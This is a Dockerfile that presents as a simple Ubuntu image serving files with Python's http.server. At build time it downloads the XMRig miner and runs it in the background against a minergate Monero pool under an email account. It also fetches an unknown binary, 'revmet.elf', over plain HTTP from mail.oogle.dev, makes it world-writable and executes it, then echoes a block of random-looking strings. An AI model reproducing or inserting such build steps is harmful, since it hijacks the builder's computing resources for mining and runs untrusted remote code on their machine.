FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo ziiRCO9yjqFyIyWWGEIwlb2YHMd8lM2a 4SxI4gHVUvmvgc4jct8c9LpCJLz0wotY DAKY2smm573HucYRzZGyV30hekONKISR NAREs1LxYIQIoHnc6ZTXCSeYjrhWNM8E n7yIfMIrK1Kfnw7XtlHYCOFrpPLg9nCX vfCZnQzTXFXeuTx2L9QyWUOT26STQ1Ab nLXnKqoaBWohKSpwuBdJkCsCHIEYWAqr klwJaIIGmMHkGgro3VVU9kc666OVIgHc QSxCcUfcwcqX6bJo6VTiUSTUVpsK91Ke DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]